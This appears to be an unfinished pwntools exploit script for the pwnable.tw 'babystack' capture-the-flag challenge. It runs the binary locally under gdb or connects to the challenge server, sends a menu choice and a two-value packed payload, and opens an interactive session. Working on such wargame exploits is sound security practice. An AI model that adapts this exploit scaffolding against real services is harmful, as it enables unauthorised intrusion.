#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("babystack_patched")
libc = elf.libc

local = True 
if local:
    p = process("./babystack_patched")
    gdb.attach(p,'''
    b*__libc_start_main+238
    c
    ''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./babystack_patched', checksec=False)

p.sendline(b"1")
payload = p64(0x4f16122ba81bbbf6) + p64(0x3a700bb73548428b)
p.sendline(payload)
p.interactive()
